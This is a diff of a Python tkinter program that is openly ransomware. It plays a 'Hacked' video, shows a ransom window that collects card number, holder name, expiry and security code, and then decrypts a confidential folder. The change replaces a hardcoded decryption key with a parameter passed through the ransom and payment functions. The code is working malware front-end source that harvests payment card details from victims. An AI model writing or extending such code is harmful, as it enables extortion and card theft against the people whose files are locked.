@@ -3,7 +3,7 @@ import tkinter as tk
 from tkinter import messagebox
 from restorer_ware import restore_files_in_directory 
 
-def validate_and_submit(window):
+def validate_and_submit(window, key):
     card_number = window.card_number_entry.get().strip()
     card_holder_name = window.card_holder_name_entry.get().strip()
     expiry_date = window.expiry_date_entry.get().strip()
@@ -15,12 +15,12 @@ def validate_and_submit(window):
     
     messagebox.showinfo("Success", "Thank you! Your details have been submitted .")
     window.destroy()
-    show_success_message()
+    show_success_message(key)
     
 
 
-def show_success_message():
-    restore_files_in_directory("./dossier_confidentiel","bonjourbonjourbonjourbonjourbonj")
+def show_success_message(key):
+    restore_files_in_directory("./dossier_confidentiel",key)
     txt_color = "lightgreen"
     bg_color = "black"
     window = tk.Tk()
@@ -73,7 +73,7 @@ def play_video(video_path):
     cv2.destroyAllWindows()
 
 
-def show_ransom_message():
+def show_ransom_message(key):
     txt_color = "lightgreen"
     bg_color = "black"
     window = tk.Tk()
@@ -104,7 +104,7 @@ def show_ransom_message():
     window.security_code_entry = tk.Entry(window)
     window.security_code_entry.pack()
     change_label_config(window, fg_color=txt_color, bg_color=bg_color)
-    pay_button = tk.Button(window, text='Pay', command=lambda: validate_and_submit(window),width=10,bg='lightgreen')
+    pay_button = tk.Button(window, text='Pay', command=lambda: validate_and_submit(window, key),width=10,bg='lightgreen')
     pay_button.pack()
 
     exit_button = tk.Button(window, text='Exit', command=window.destroy,width=10,bg='red')
@@ -113,7 +113,7 @@ def show_ransom_message():
     window.mainloop()
 
 
-def Main():
+def Main(key):
     video_path = "Hacked.mp4" 
     play_video(video_path)
-    show_ransom_message()
+    show_ransom_message(key)
